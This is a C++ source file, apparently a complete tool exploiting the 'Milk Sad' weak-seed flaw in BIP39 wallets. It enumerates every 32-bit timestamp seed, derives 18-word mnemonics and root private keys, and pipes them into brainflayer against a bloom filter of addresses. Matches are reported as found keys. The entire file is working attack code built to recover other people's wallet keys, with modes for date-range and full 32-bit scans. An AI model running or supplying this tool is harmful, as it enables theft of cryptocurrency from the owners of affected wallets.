/**
 * Milk Sad Vulnerability Reproducer (Upgraded - 18 Words Variant + Live Found Monitor)
 * Generates BIP39 Mnemonics (192-bit / 18 Words) based on 32-bit Time Seed
 * checks against brainflayer via pipe.
 */

#include <iostream>
#include <fstream>
#include <random>
#include <vector>
#include <string>
#include <iomanip>
#include <signal.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sstream>
#include <ctime>
#include <cmath>
#include <stdexcept>
#include <algorithm>
#include <openssl/sha.h>
#include <openssl/evp.h>
#include <openssl/hmac.h>
#include <cctype>
#include <thread>
#include <atomic>
#include <mutex>
#include <chrono>
#include <cstdio>
#include <cstring>
#include <cerrno>
#include <climits>

// --- Configuration ---
const std::string WORDLIST_DIR = "./Wordlist/";
const std::string OUTPUT_FILE_PREFIX = "brainflayer_found_";
const uint64_t REPORT_INTERVAL = 50000; // Report & Check file every N keys per thread
const int DEFAULT_NUM_THREADS = 16; 

// --- Global Flags & Counters ---
std::atomic<bool> g_stop_flag(false);
std::atomic<uint64_t> g_total_found_keys(0); // [UPGRADE] Global counter for found keys

// --- Signal Handler ---
void signal_handler(int) {
    g_stop_flag = true;
    std::cout << "\n[!] Interrupt received. Stopping threads..." << std::endl;
}

// --- Helper Functions ---

bool file_exists(const std::string& filename) {
    struct stat buffer;
    return (stat(filename.c_str(), &buffer) == 0);
}

// [UPGRADE] Function to count lines in a file to detect hits
size_t count_lines_in_file(const std::string& filename) {
    std::ifstream file(filename);
    if (!file.is_open()) return 0;
    
    // Fast way to count newlines
    return std::count(std::istreambuf_iterator<char>(file), 
                      std::istreambuf_iterator<char>(), '\n');
}

std::vector<std::string> load_wordlist(const std::string& filename) {
    std::vector<std::string> wordlist;
    std::string path = WORDLIST_DIR + filename;
    
    // Fallback: check current directory if not in Wordlist/
    if (!file_exists(path) && file_exists(filename)) {
        path = filename;
    }

    std::ifstream file(path);
    if (!file) {
        throw std::runtime_error("Could not open wordlist: " + path);
    }

    std::string word;
    while (std::getline(file, word)) {
        // Trim whitespace
        size_t first = word.find_first_not_of(" \t\r\n");
        if (first == std::string::npos) continue;
        size_t last = word.find_last_not_of(" \t\r\n");
        wordlist.push_back(word.substr(first, (last - first + 1)));
    }

    if (wordlist.size() != 2048) {
        throw std::runtime_error("Wordlist must contain exactly 2048 words. Found: " + std::to_string(wordlist.size()));
    }
    return wordlist;
}

// --- Crypto Functions ---

// SHA256 Helper
std::vector<uint8_t> sha256(const std::vector<uint8_t>& data) {
    std::vector<uint8_t> hash(SHA256_DIGEST_LENGTH);
    SHA256_CTX sha256_ctx;
    SHA256_Init(&sha256_ctx);
    SHA256_Update(&sha256_ctx, data.data(), data.size());
    SHA256_Final(hash.data(), &sha256_ctx);
    return hash;
}

// Generate BIP39 Mnemonic from a 32-bit Time Seed (Modified for 18 Words / 192-bit)
std::string generate_mnemonic_bip39(uint32_t seed_value, const std::vector<std::string>& wordlist) {
    std::mt19937 engine(seed_value);

    // 192 bits (24 bytes) of entropy for 18 words
    const int ENTROPY_BYTES = 24; 
    std::vector<uint8_t> entropy(ENTROPY_BYTES);
    
    for (size_t i = 0; i < ENTROPY_BYTES; i += 4) {
        uint32_t random_block = engine();
        std::memcpy(&entropy[i], &random_block, 4);
    }

    // Checksum: 192 / 32 = 6 bits
    std::vector<uint8_t> hash = sha256(entropy);
    uint8_t checksum_byte = hash[0];

    // Combine Entropy + Checksum
    std::vector<uint8_t> combined = entropy;
    combined.push_back(checksum_byte); 

    std::string mnemonic;
    mnemonic.reserve(200); 

    const int NUM_WORDS = 18;
    for (int i = 0; i < NUM_WORDS; ++i) {
        int start_bit = i * 11;
        int word_index = 0;

        for (int bit = 0; bit < 11; ++bit) {
            int total_bit_pos = start_bit + bit;
            int byte_pos = total_bit_pos / 8;
            int bit_pos_in_byte = 7 - (total_bit_pos % 8); 

            if ((combined[byte_pos] >> bit_pos_in_byte) & 1) {
                word_index |= (1 << (10 - bit));
            }
        }

        if (i > 0) mnemonic += " ";
        mnemonic += wordlist[word_index];
    }

    return mnemonic;
}

// Convert Mnemonic to Root Private Key
std::string mnemonic_to_root_key_hex(const std::string& mnemonic) {
    const int iterations = 2048;
    const std::string salt = "mnemonic"; 
    std::vector<uint8_t> seed(64);
    
    if (PKCS5_PBKDF2_HMAC(mnemonic.c_str(), mnemonic.length(),
                          reinterpret_cast<const unsigned char*>(salt.c_str()), salt.length(),
                          iterations, EVP_sha512(), seed.size(), seed.data()) == 0) {
        return "";
    }

    const std::string hmac_key = "Bitcoin seed";
    unsigned char hmac_result[64];
    unsigned int hmac_len;
    
    HMAC(EVP_sha512(), 
         reinterpret_cast<const void*>(hmac_key.c_str()), hmac_key.length(),
         seed.data(), seed.size(), 
         hmac_result, &hmac_len);

    std::stringstream ss;
    ss << std::hex << std::setfill('0');
    for (int i = 0; i < 32; ++i) {
        ss << std::setw(2) << static_cast<int>(hmac_result[i]);
    }
    return ss.str();
}

// --- Time Utilities ---

uint32_t get_unix_timestamp(const std::tm& tm) {
    std::tm temp_tm = tm;
    #ifdef _WIN32
        _putenv("TZ=UTC");
        _tzset();
    #else
        setenv("TZ", "UTC", 1);
        tzset();
    #endif
    
    time_t ts = std::mktime(&temp_tm);
    if (ts == -1) throw std::runtime_error("Invalid time format");
    return static_cast<uint32_t>(ts);
}

std::tm parse_iso_date(const std::string& s) {
    std::tm tm = {};
    std::stringstream ss(s);
    ss >> std::get_time(&tm, "%Y-%m-%d");
    if (ss.fail()) throw std::runtime_error("Parse error. Use YYYY-MM-DD");
    tm.tm_isdst = 0;
    return tm;
}

// --- Worker Thread ---

void worker_thread(uint32_t start_ts, uint32_t end_ts, int thread_id, 
                   const std::vector<std::string>& wordlist,
                   std::atomic<uint64_t>& global_counter,
                   std::mutex& print_mtx) {
    
    // Output filename specific to this thread
    std::string output_filename = OUTPUT_FILE_PREFIX + std::to_string(thread_id) + ".txt";
    
    // Command to pipe into brainflayer
    std::string cmd = "./brainflayer/brainflayer -v -b ./040823BF.blf -t priv -x > " + output_filename + " 2>&1";
    
    FILE* pipe = popen(cmd.c_str(), "w");
    if (!pipe) {
        std::lock_guard<std::mutex> lock(print_mtx);
        std::cerr << "[Thread " << thread_id << "] Error: Failed to open brainflayer pipe." << std::endl;
        return;
    }

    uint64_t local_processed = 0;
    size_t last_known_found_count = 0; // [UPGRADE] Track local file lines
    
    for (uint32_t ts = start_ts; ts <= end_ts && !g_stop_flag; ++ts) {
        // Core Logic
        std::string mnemonic = generate_mnemonic_bip39(ts, wordlist);
        std::string priv_hex = mnemonic_to_root_key_hex(mnemonic);
        
        // Write to brainflayer
        if (fprintf(pipe, "%s\n", priv_hex.c_str()) < 0) {
             break; // Pipe broken
        }

        local_processed++;
        global_counter.fetch_add(1, std::memory_order_relaxed);

        // Progress logging & Hit Checking
        if (local_processed % REPORT_INTERVAL == 0) {
            // [UPGRADE] Check if the output file has grown (meaning brainflayer found something)
            size_t current_lines = count_lines_in_file(output_filename);
            
            std::lock_guard<std::mutex> lock(print_mtx);
            
            // Check for NEW hits
            if (current_lines > last_known_found_count) {
                size_t new_hits = current_lines - last_known_found_count;
                g_total_found_keys += new_hits;
                std::cout << "\n\033[1;32m[!!!] THREAD " << thread_id << " FOUND " << new_hits << " KEYS! Check " << output_filename << "\033[0m" << std::endl;
                last_known_found_count = current_lines;
            }

            std::cout << "[Thread " << thread_id << "] TS: " << ts 
                      << " | Processed: " << local_processed 
                      << " | Found (Local): " << last_known_found_count 
                      << std::endl;
        }
    }

    pclose(pipe);
    
    {
        std::lock_guard<std::mutex> lock(print_mtx);
        // Final check
        size_t final_lines = count_lines_in_file(output_filename);
        if (final_lines > last_known_found_count) {
             g_total_found_keys += (final_lines - last_known_found_count);
        }
        std::cout << "[Thread " << thread_id << "] Finished. Total processed: " << local_processed 
                  << " | Total Found: " << final_lines << std::endl;
    }
}

// --- Main Menu & Logic ---

int main() {
    signal(SIGPIPE, SIG_IGN);
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);

    OpenSSL_add_all_algorithms();

    std::cout << "======================================================" << std::endl;
    std::cout << " Milk Sad Vulnerability Reproducer (18 Words + Stats) " << std::endl;
    std::cout << "======================================================" << std::endl;

    // Prerequisites check
    if (!file_exists("./brainflayer/brainflayer")) {
        std::cerr << "Error: ./brainflayer/brainflayer executable not found!" << std::endl;
        return 1;
    }
    if (!file_exists("./040823BF.blf")) {
        std::cerr << "Error: Bloom filter ./040823BF.blf not found!" << std::endl;
        return 1;
    }

    // Load Wordlist
    std::vector<std::string> wordlist;
    try {
        std::cout << "[*] Loading english.txt..." << std::endl;
        wordlist = load_wordlist("english.txt");
    } catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;
        return 1;
    }

    int choice;
    std::cout << "\nSelect Mode:\n";
    std::cout << "1. Single Timestamp Check\n";
    std::cout << "2. Date Range Scan (Multithreaded)\n";
    std::cout << "3. Full 32-bit Scan (Warning: Long duration)\n";
    std::cout << "> ";
    std::cin >> choice;

    uint32_t start_ts = 0, end_ts = 0;

    if (choice == 1) {
        // [UPGRADE] Enhanced single check feedback
        std::string date_str, time_str;
        std::cout << "Enter Date (YYYY-MM-DD): ";
        std::cin >> date_str;
        std::cout << "Enter Time (HH:MM:SS): ";
        std::cin >> time_str;

        std::tm tm = parse_iso_date(date_str);
        sscanf(time_str.c_str(), "%d:%d:%d", &tm.tm_hour, &tm.tm_min, &tm.tm_sec);
        
        uint32_t ts = get_unix_timestamp(tm);
        std::cout << "\nChecking Timestamp: " << ts << std::endl;
        
        std::string m = generate_mnemonic_bip39(ts, wordlist);
        std::string k = mnemonic_to_root_key_hex(m);
        std::cout << "Mnemonic: " << m << std::endl;
        std::cout << "Root Key: " << k << std::endl;
        std::cout << "Checking against bloom filter..." << std::endl;
        
        // Use system to pipe directly to stdout for single check
        std::string cmd = "echo " + k + " | ./brainflayer/brainflayer -v -b ./040823BF.blf -t priv -x";
        int ret = system(cmd.c_str());
        
        if (ret == 0) {
             std::cout << "\n[Note] If you see a key above, it was FOUND." << std::endl;
        }
        return 0;

    } else if (choice == 2) {
        std::string start_str, end_str;
        std::cout << "Start Date (YYYY-MM-DD): ";
        std::cin >> start_str;
        std::cout << "End Date   (YYYY-MM-DD): ";
        std::cin >> end_str;

        std::tm tm_start = parse_iso_date(start_str);
        std::tm tm_end = parse_iso_date(end_str);
        tm_start.tm_hour = 0; tm_start.tm_min = 0; tm_start.tm_sec = 0;
        tm_end.tm_hour = 23; tm_end.tm_min = 59; tm_end.tm_sec = 59;

        start_ts = get_unix_timestamp(tm_start);
        end_ts = get_unix_timestamp(tm_end);

    } else if (choice == 3) {
        start_ts = 0;
        end_ts = UINT_MAX;
    } else {
        std::cout << "Invalid choice." << std::endl;
        return 1;
    }

    int num_threads = DEFAULT_NUM_THREADS;
    std::cout << "Enter number of threads (Default " << DEFAULT_NUM_THREADS << "): ";
    if (std::cin.peek() != '\n') std::cin >> num_threads;
    if (num_threads < 1) num_threads = 1;

    // Clear old result files (Optional, for safety)
    for(int i=0; i<num_threads; i++) {
        std::string fname = OUTPUT_FILE_PREFIX + std::to_string(i) + ".txt";
        remove(fname.c_str());
    }

    std::cout << "\n[*] Starting Scan..." << std::endl;
    std::cout << "Range: " << start_ts << " to " << end_ts << std::endl;
    std::cout << "Total keys to generate: " << (uint64_t)end_ts - start_ts << std::endl;

    std::vector<std::thread> threads;
    std::atomic<uint64_t> total_counter(0);
    std::mutex print_mutex;

    uint64_t total_range = (uint64_t)end_ts - start_ts + 1;
    uint64_t chunk_size = total_range / num_threads;

    for (int i = 0; i < num_threads; ++i) {
        uint32_t t_start = start_ts + (i * chunk_size);
        uint32_t t_end = (i == num_threads - 1) ? end_ts : t_start + chunk_size - 1;

        threads.emplace_back(worker_thread, t_start, t_end, i, 
                             std::cref(wordlist), 
                             std::ref(total_counter), 
                             std::ref(print_mutex));
    }

    // Main thread monitoring loop (optional additional stats)
    while(!g_stop_flag) {
        std::this_thread::sleep_for(std::chrono::seconds(2));
        bool all_done = true;
        // Simple check if threads are still running would require more logic,
        // so we just rely on join() below. 
        // We can just print a summary line here if needed.
    }

    for (auto& t : threads) {
        if (t.joinable()) t.join();
    }

    std::cout << "\n======================================================" << std::endl;
    std::cout << " [!] Scan Complete." << std::endl;
    std::cout << " Total Keys Processed: " << total_counter.load() << std::endl;
    
    // [UPGRADE] Final Result Summary
    uint64_t final_found = g_total_found_keys.load();
    if (final_found > 0) {
        std::cout << "\033[1;32m [SUCCESS] TOTAL KEYS FOUND: " << final_found << " \033[0m" << std::endl;
        std::cout << " Check files named '" << OUTPUT_FILE_PREFIX << "*.txt'" << std::endl;
    } else {
        std::cout << " [RESULT] No keys found in this range." << std::endl;
    }
    std::cout << "======================================================" << std::endl;

    return 0;
}
